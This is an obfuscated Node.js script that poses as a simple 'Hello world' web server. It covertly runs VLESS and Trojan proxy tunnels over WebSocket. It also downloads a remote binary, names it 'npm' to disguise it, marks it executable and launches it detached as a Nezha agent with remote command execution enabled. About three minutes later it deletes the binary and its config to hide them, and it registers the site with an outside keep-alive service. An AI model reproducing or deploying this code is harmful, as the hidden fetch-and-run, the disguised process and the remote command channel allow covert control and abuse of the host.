const _0x3e736b=_0x2b53;(function(_0x494187,_0x5b39dc){const _0x3036ed=_0x2b53,_0xbf24e5=_0x494187();while(!![]){try{const _0x231579=parseInt(_0x3036ed(0x8e))/0x1+-parseInt(_0x3036ed(0x82))/0x2+-parseInt(_0x3036ed(0xe5))/0x3+parseInt(_0x3036ed(0xd8))/0x4*(-parseInt(_0x3036ed(0xcb))/0x5)+parseInt(_0x3036ed(0xb2))/0x6*(-parseInt(_0x3036ed(0x9a))/0x7)+-parseInt(_0x3036ed(0x98))/0x8+parseInt(_0x3036ed(0xdc))/0x9;if(_0x231579===_0x5b39dc)break;else _0xbf24e5['push'](_0xbf24e5['shift']());}catch(_0x248272){_0xbf24e5['push'](_0xbf24e5['shift']());}}}(_0x155a,0x48517));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3e736b(0xed)),net=require(_0x3e736b(0x9f)),path=require(_0x3e736b(0x95)),crypto=require(_0x3e736b(0xd9)),{Buffer}=require(_0x3e736b(0xb4)),{exec,execSync}=require(_0x3e736b(0x86)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3e736b(0xc7)][_0x3e736b(0xce)]||_0x3e736b(0xb0),NEZHA_SERVER=process[_0x3e736b(0xc7)][_0x3e736b(0xf0)]||'',NEZHA_PORT=process[_0x3e736b(0xc7)][_0x3e736b(0xe3)]||'',NEZHA_KEY=process['env'][_0x3e736b(0x84)]||'',DOMAIN=process[_0x3e736b(0xc7)]['DOMAIN']||_0x3e736b(0xad),AUTO_ACCESS=process[_0x3e736b(0xc7)][_0x3e736b(0xe8)]||!![],WSPATH=process[_0x3e736b(0xc7)][_0x3e736b(0xb8)]||UUID[_0x3e736b(0xdb)](0x0,0x8),SUB_PATH=process['env'][_0x3e736b(0xc9)]||_0x3e736b(0x85),NAME=process[_0x3e736b(0xc7)][_0x3e736b(0xd4)]||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1697a1=_0x3e736b;try{const _0x47f31f=await axios[_0x1697a1(0xb9)](_0x1697a1(0x9d)),_0x3146d7=_0x47f31f[_0x1697a1(0x8c)];ISP=(_0x3146d7[_0x1697a1(0xa5)]+'-'+_0x3146d7['isp'])[_0x1697a1(0x9c)](/ /g,'_');}catch(_0x3a3ec8){ISP='Unknown';}};GetISP();const httpServer=http[_0x3e736b(0x8b)]((_0x1e30c5,_0x29e813)=>{const _0xf981f9=_0x3e736b;if(_0x1e30c5['url']==='/'){const _0x6ef0a=path['join'](__dirname,_0xf981f9(0x81));fs[_0xf981f9(0xa9)](_0x6ef0a,'utf8',(_0x3a0f4c,_0x39012c)=>{const _0xbb786d=_0xf981f9;if(_0x3a0f4c){_0x29e813[_0xbb786d(0xa1)](0xc8,{'Content-Type':_0xbb786d(0xcd)}),_0x29e813[_0xbb786d(0x9e)]('Hello\x20world!');return;}_0x29e813[_0xbb786d(0xa1)](0xc8,{'Content-Type':_0xbb786d(0xcd)}),_0x29e813[_0xbb786d(0x9e)](_0x39012c);});return;}else{if(_0x1e30c5['url']==='/'+SUB_PATH){const _0x124ef=NAME?NAME+'-'+ISP:ISP,_0x21bed3='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0xf981f9(0xd3)+DOMAIN+_0xf981f9(0xc5)+WSPATH+'#'+_0x124ef,_0xca71f0=_0xf981f9(0xeb)+UUID+'@'+DOMAIN+_0xf981f9(0xbb)+DOMAIN+_0xf981f9(0xd3)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x124ef,_0x4dccc4=_0x21bed3+'\x0a'+_0xca71f0,_0x38a0df=Buffer[_0xf981f9(0x91)](_0x4dccc4)['toString']('base64');_0x29e813['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x29e813[_0xf981f9(0x9e)](_0x38a0df+'\x0a');}else _0x29e813['writeHead'](0x194,{'Content-Type':_0xf981f9(0x7e)}),_0x29e813['end'](_0xf981f9(0x87));}}),wss=new WebSocket[(_0x3e736b(0xa8))]({'server':httpServer}),uuid=UUID[_0x3e736b(0x9c)](/-/g,''),DNS_SERVERS=[_0x3e736b(0xe2),_0x3e736b(0xa6)];function resolveHost(_0x2b47b7){return new Promise((_0x124f04,_0x3c0bab)=>{const _0x4b5097=_0x2b53;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4b5097(0xe0)](_0x2b47b7)){_0x124f04(_0x2b47b7);return;}let _0x468c67=0x0;function _0x40389e(){const _0x32dd60=_0x4b5097;if(_0x468c67>=DNS_SERVERS[_0x32dd60(0x97)]){_0x3c0bab(new Error(_0x32dd60(0x96)+_0x2b47b7+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x12a0ad=DNS_SERVERS[_0x468c67];_0x468c67++;const _0x2abf8b=_0x32dd60(0xac)+encodeURIComponent(_0x2b47b7)+_0x32dd60(0xb6);axios['get'](_0x2abf8b,{'timeout':0x1388,'headers':{'Accept':_0x32dd60(0xe1)}})[_0x32dd60(0x7f)](_0x3a2be6=>{const _0x51fa2a=_0x32dd60,_0x32b106=_0x3a2be6[_0x51fa2a(0x8c)];if(_0x32b106[_0x51fa2a(0x7c)]===0x0&&_0x32b106[_0x51fa2a(0xd5)]&&_0x32b106[_0x51fa2a(0xd5)]['length']>0x0){const _0x45ab45=_0x32b106[_0x51fa2a(0xd5)][_0x51fa2a(0x7d)](_0x593b55=>_0x593b55[_0x51fa2a(0xab)]===0x1);if(_0x45ab45){_0x124f04(_0x45ab45['data']);return;}}_0x40389e();})[_0x32dd60(0xb7)](_0x533037=>{_0x40389e();});}_0x40389e();});}function _0x155a(){const _0x324a38=['child_process','Not\x20Found\x0a','npm\x20is\x20already\x20running,\x20skip\x20running...','substr','map','createServer','data','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','203544LTegOf','reduce','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','from','toString','listen','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','path','Failed\x20to\x20resolve\x20','length','3517032SGwRJo','readUInt16BE','14szdkvn','error:\x20','replace','https://api.ip.sb/geoip','end','net','url','writeHead','https://oooo.serv00.net/add-url','createWriteStream','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','country_code','1.1.1.1','2087','Server','readFile','every','type','https://dns.google/resolve?name=','1234.abc.com','https://amd64.ssss.nyc.mn/v1','application/json','83894663-1d40-40d5-b659-ca729fe6f241','chmod\x20+x\x20npm','397572hyaxfi','join','buffer','createHash','&type=A','catch','WSPATH','get','once',':443?security=tls&sni=','log','finish','setsid\x20nohup\x20./npm\x20-s\x20','pop','\x20-p\x20','connect','post','write','utf-8','&path=%2F','https://arm64.ssss.nyc.mn/v1','env','/bin/bash','SUB_PATH','writeFileSync','32620DoFvUL','error','text/html','UUID','message','--tls','connection','includes','&fp=chrome&type=ws&host=','NAME','Answer','decode','npm\x20running\x20error:','224adMhzW','crypto','config.yaml','slice','9837333hHhelX','2096','arch','close','test','application/dns-json','8.8.4.4','NEZHA_PORT','https://amd64.ssss.nyc.mn/agent','158106FfDbCV','arm64','unlink','AUTO_ACCESS','concat','npm','trojan://','update','axios','digest','pipe','NEZHA_SERVER','8443','443','Status','find','text/plain','then','Automatic\x20Access\x20Task\x20added\x20successfully','index.html','20334jCmaZx','readUInt8','NEZHA_KEY','userconfig'];_0x155a=function(){return _0x324a38;};return _0x155a();}function handleVlessConnection(_0x19cf0a,_0x552dc5){const _0x517448=_0x3e736b,[_0x3087ea]=_0x552dc5,_0x2dcd23=_0x552dc5[_0x517448(0xdb)](0x1,0x11);if(!_0x2dcd23['every']((_0x5d0f41,_0x2bd66a)=>_0x5d0f41==parseInt(uuid[_0x517448(0x89)](_0x2bd66a*0x2,0x2),0x10)))return![];let _0x2915ab=_0x552dc5[_0x517448(0xdb)](0x11,0x12)['readUInt8']()+0x13;const _0x54ed93=_0x552dc5['slice'](_0x2915ab,_0x2915ab+=0x2)['readUInt16BE'](0x0),_0x5872ef=_0x552dc5[_0x517448(0xdb)](_0x2915ab,_0x2915ab+=0x1)[_0x517448(0x83)](),_0x5b5a26=_0x5872ef==0x1?_0x552dc5[_0x517448(0xdb)](_0x2915ab,_0x2915ab+=0x4)['join']('.'):_0x5872ef==0x2?new TextDecoder()[_0x517448(0xd6)](_0x552dc5[_0x517448(0xdb)](_0x2915ab+0x1,_0x2915ab+=0x1+_0x552dc5[_0x517448(0xdb)](_0x2915ab,_0x2915ab+0x1)[_0x517448(0x83)]())):_0x5872ef==0x3?_0x552dc5['slice'](_0x2915ab,_0x2915ab+=0x10)[_0x517448(0x8f)]((_0x571bbd,_0x5ac474,_0x328fca,_0x377f41)=>_0x328fca%0x2?_0x571bbd['concat'](_0x377f41[_0x517448(0xdb)](_0x328fca-0x1,_0x328fca+0x1)):_0x571bbd,[])[_0x517448(0x8a)](_0x1f2f3e=>_0x1f2f3e[_0x517448(0x99)](0x0)[_0x517448(0x92)](0x10))[_0x517448(0xb3)](':'):'';_0x19cf0a['send'](new Uint8Array([_0x3087ea,0x0]));const _0x31508=createWebSocketStream(_0x19cf0a);return resolveHost(_0x5b5a26)[_0x517448(0x7f)](_0x6676db=>{net['connect']({'host':_0x6676db,'port':_0x54ed93},function(){const _0x3ac331=_0x2b53;this[_0x3ac331(0xc3)](_0x552dc5[_0x3ac331(0xdb)](_0x2915ab)),_0x31508['on'](_0x3ac331(0xcc),()=>{})[_0x3ac331(0xef)](this)['on'](_0x3ac331(0xcc),()=>{})[_0x3ac331(0xef)](_0x31508);})['on']('error',()=>{});})[_0x517448(0xb7)](_0x5baa6a=>{const _0x2d521d=_0x517448;net[_0x2d521d(0xc1)]({'host':_0x5b5a26,'port':_0x54ed93},function(){const _0x5501c6=_0x2d521d;this['write'](_0x552dc5[_0x5501c6(0xdb)](_0x2915ab)),_0x31508['on'](_0x5501c6(0xcc),()=>{})['pipe'](this)['on'](_0x5501c6(0xcc),()=>{})[_0x5501c6(0xef)](_0x31508);})['on'](_0x2d521d(0xcc),()=>{});}),!![];}function handleTrojanConnection(_0x1bf2b6,_0x2205b3){const _0x322b68=_0x3e736b;try{if(_0x2205b3['length']<0x3a)return![];const _0xed92ab=_0x2205b3[_0x322b68(0xdb)](0x0,0x38)[_0x322b68(0x92)](),_0x4c4e86=[UUID];let _0x56cfde=null;for(const _0x33275f of _0x4c4e86){const _0x4eb3fc=crypto[_0x322b68(0xb5)]('sha224')[_0x322b68(0xec)](_0x33275f)[_0x322b68(0xee)]('hex');if(_0x4eb3fc===_0xed92ab){_0x56cfde=_0x33275f;break;}}if(!_0x56cfde)return![];let _0x3d24b6=0x38;_0x2205b3[_0x3d24b6]===0xd&&_0x2205b3[_0x3d24b6+0x1]===0xa&&(_0x3d24b6+=0x2);const _0x56396e=_0x2205b3[_0x3d24b6];if(_0x56396e!==0x1)return![];_0x3d24b6+=0x1;const _0x33b756=_0x2205b3[_0x3d24b6];_0x3d24b6+=0x1;let _0x21d94f,_0x312442;if(_0x33b756===0x1)_0x21d94f=_0x2205b3[_0x322b68(0xdb)](_0x3d24b6,_0x3d24b6+0x4)['join']('.'),_0x3d24b6+=0x4;else{if(_0x33b756===0x3){const _0x45d29a=_0x2205b3[_0x3d24b6];_0x3d24b6+=0x1,_0x21d94f=_0x2205b3['slice'](_0x3d24b6,_0x3d24b6+_0x45d29a)[_0x322b68(0x92)](),_0x3d24b6+=_0x45d29a;}else{if(_0x33b756===0x4)_0x21d94f=_0x2205b3[_0x322b68(0xdb)](_0x3d24b6,_0x3d24b6+0x10)['reduce']((_0xaa3cae,_0x5d323a,_0x10ea4e,_0x31a200)=>_0x10ea4e%0x2?_0xaa3cae[_0x322b68(0xe9)](_0x31a200[_0x322b68(0xdb)](_0x10ea4e-0x1,_0x10ea4e+0x1)):_0xaa3cae,[])[_0x322b68(0x8a)](_0x691a14=>_0x691a14[_0x322b68(0x99)](0x0)[_0x322b68(0x92)](0x10))[_0x322b68(0xb3)](':'),_0x3d24b6+=0x10;else return![];}}_0x312442=_0x2205b3[_0x322b68(0x99)](_0x3d24b6),_0x3d24b6+=0x2;_0x3d24b6<_0x2205b3[_0x322b68(0x97)]&&_0x2205b3[_0x3d24b6]===0xd&&_0x2205b3[_0x3d24b6+0x1]===0xa&&(_0x3d24b6+=0x2);const _0x4c2b7e=createWebSocketStream(_0x1bf2b6);return resolveHost(_0x21d94f)[_0x322b68(0x7f)](_0x331fb7=>{const _0x466119=_0x322b68;net['connect']({'host':_0x331fb7,'port':_0x312442},function(){const _0x32bf6d=_0x2b53;_0x3d24b6<_0x2205b3['length']&&this[_0x32bf6d(0xc3)](_0x2205b3[_0x32bf6d(0xdb)](_0x3d24b6)),_0x4c2b7e['on'](_0x32bf6d(0xcc),()=>{})[_0x32bf6d(0xef)](this)['on']('error',()=>{})[_0x32bf6d(0xef)](_0x4c2b7e);})['on'](_0x466119(0xcc),()=>{});})[_0x322b68(0xb7)](_0x5c229b=>{const _0x3fb4ba=_0x322b68;net[_0x3fb4ba(0xc1)]({'host':_0x21d94f,'port':_0x312442},function(){const _0xd61e0f=_0x3fb4ba;_0x3d24b6<_0x2205b3[_0xd61e0f(0x97)]&&this[_0xd61e0f(0xc3)](_0x2205b3['slice'](_0x3d24b6)),_0x4c2b7e['on']('error',()=>{})[_0xd61e0f(0xef)](this)['on'](_0xd61e0f(0xcc),()=>{})[_0xd61e0f(0xef)](_0x4c2b7e);})['on'](_0x3fb4ba(0xcc),()=>{});}),!![];}catch(_0x188b61){return![];}}wss['on'](_0x3e736b(0xd1),(_0x105bea,_0x1f8898)=>{const _0x2436ad=_0x3e736b,_0x906bb4=_0x1f8898[_0x2436ad(0xa0)]||'';_0x105bea[_0x2436ad(0xba)](_0x2436ad(0xcf),_0x5f09d8=>{const _0x2e02d1=_0x2436ad;if(_0x5f09d8[_0x2e02d1(0x97)]>0x11&&_0x5f09d8[0x0]===0x0){const _0x49331b=_0x5f09d8[_0x2e02d1(0xdb)](0x1,0x11),_0x3bdd91=_0x49331b[_0x2e02d1(0xaa)]((_0x422357,_0x173450)=>_0x422357==parseInt(uuid['substr'](_0x173450*0x2,0x2),0x10));if(_0x3bdd91){!handleVlessConnection(_0x105bea,_0x5f09d8)&&_0x105bea['close']();return;}}!handleTrojanConnection(_0x105bea,_0x5f09d8)&&_0x105bea[_0x2e02d1(0xdf)]();})['on'](_0x2436ad(0xcc),()=>{});});const getDownloadUrl=()=>{const _0x31bb38=_0x3e736b,_0x508393=os[_0x31bb38(0xde)]();return _0x508393==='arm'||_0x508393===_0x31bb38(0xe6)||_0x508393==='aarch64'?!NEZHA_PORT?_0x31bb38(0xc6):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x31bb38(0xae):_0x31bb38(0xe4);},downloadFile=async()=>{const _0x243765=_0x3e736b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x35f798=getDownloadUrl(),_0x59d512=await axios({'method':_0x243765(0xb9),'url':_0x35f798,'responseType':'stream'}),_0x1a0268=fs[_0x243765(0xa3)](_0x243765(0xea));return _0x59d512['data'][_0x243765(0xef)](_0x1a0268),new Promise((_0x5f3181,_0x28c79d)=>{const _0x16328c=_0x243765;_0x1a0268['on'](_0x16328c(0xbd),()=>{const _0x22dd7a=_0x16328c;console[_0x22dd7a(0xbc)]('npm\x20download\x20successfully'),exec(_0x22dd7a(0xb1),_0x3d2ca7=>{if(_0x3d2ca7)_0x28c79d(_0x3d2ca7);_0x5f3181();});}),_0x1a0268['on'](_0x16328c(0xcc),_0x28c79d);});}catch(_0x2a7576){throw _0x2a7576;}},runnz=async()=>{const _0x4ec3fc=_0x3e736b;try{const _0x1d8f2f=execSync(_0x4ec3fc(0x94),{'encoding':_0x4ec3fc(0xc4)});if(_0x1d8f2f['trim']()!==''){console['log'](_0x4ec3fc(0x88));return;}}catch(_0x1f1622){}await downloadFile();let _0x5e3857='',_0x26f66a=[_0x4ec3fc(0xf2),_0x4ec3fc(0xf1),_0x4ec3fc(0xdd),_0x4ec3fc(0xa7),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x320f01=_0x26f66a[_0x4ec3fc(0xd2)](NEZHA_PORT)?_0x4ec3fc(0xd0):'';_0x5e3857=_0x4ec3fc(0xbe)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4ec3fc(0xc0)+NEZHA_KEY+'\x20'+_0x320f01+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x18a251=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x4ec3fc(0xbf)]():'',_0x5268de=_0x26f66a[_0x4ec3fc(0xd2)](_0x18a251)?'true':'false',_0x1670df='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4ec3fc(0x8d)+_0x5268de+_0x4ec3fc(0x90)+UUID;fs[_0x4ec3fc(0xca)](_0x4ec3fc(0xda),_0x1670df);}_0x5e3857=_0x4ec3fc(0xa4);}else{console[_0x4ec3fc(0xbc)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5e3857,{'shell':_0x4ec3fc(0xc8)},_0x9589f4=>{const _0x23708b=_0x4ec3fc;if(_0x9589f4)console[_0x23708b(0xcc)](_0x23708b(0xd7),_0x9589f4);else console[_0x23708b(0xbc)]('npm\x20is\x20running');});}catch(_0x58625d){console[_0x4ec3fc(0xcc)](_0x4ec3fc(0x9b)+_0x58625d);}};function _0x2b53(_0x6ef1a4,_0x48334e){_0x6ef1a4=_0x6ef1a4-0x7c;const _0x155aae=_0x155a();let _0x2b53b5=_0x155aae[_0x6ef1a4];return _0x2b53b5;}async function addAccessTask(){const _0x42edec=_0x3e736b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x34f1d='https://'+DOMAIN;try{const _0x4256e0=await axios[_0x42edec(0xc2)](_0x42edec(0xa2),{'url':_0x34f1d},{'headers':{'Content-Type':_0x42edec(0xaf)}});console[_0x42edec(0xbc)](_0x42edec(0x80));}catch(_0x5a4ac9){}}const delFiles=()=>{const _0xf87a1f=_0x3e736b;fs[_0xf87a1f(0xe7)](_0xf87a1f(0xea),()=>{}),fs[_0xf87a1f(0xe7)](_0xf87a1f(0xda),()=>{});};httpServer[_0x3e736b(0x93)](PORT,()=>{const _0x21b111=_0x3e736b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x21b111(0xbc)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
